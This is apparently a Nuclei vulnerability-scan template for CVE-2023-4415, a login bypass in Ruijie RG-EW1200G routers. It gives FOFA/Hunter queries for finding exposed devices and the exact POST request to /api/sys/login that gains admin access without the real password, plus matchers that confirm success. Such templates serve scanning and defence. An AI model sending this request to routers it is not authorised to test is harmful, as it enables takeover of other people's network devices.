id: CVE-2023-4415

info:
  name: 锐捷(ruijie)RG-EW1200G路由器 后台登录绕过
  author: Y3y1ng
  severity: high
  description: |
    Ruijie Networks RG-EW1200G是中国锐捷网络（Ruijie Networks）公司的一款无线路由器。
    锐捷网络RG-EW1200G路由器 存在登录绕过逻辑漏洞，允许任何用户无需密码即可获得路由器后台，该漏洞源于文件/api/sys/login存在不当的身份验证。
    FOFA: "锐捷" && port="6060"
    FOFA: body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
    HUNTER：web.body="app.2fe6356cdd1ddd0eb8d6317d1a48d379.css"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-4415
    - https://github.com/blakespire/repoforcve/tree/main/RG-EW1200G-logic
  tags: Ruijie-下一代防火墙
flow: |
  http("r0")

http:
  - id: "r0"
    raw:
      - |
        POST /api/sys/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        {
        "username":"2",
        "password":"admin",
        "timestamp":1695218596000
        }
        

    matchers:
      - type: dsl
        dsl:
          - contains(body,"登入成功")&& contains(body,"ok") && contains(body,"gateway")
        condition: and

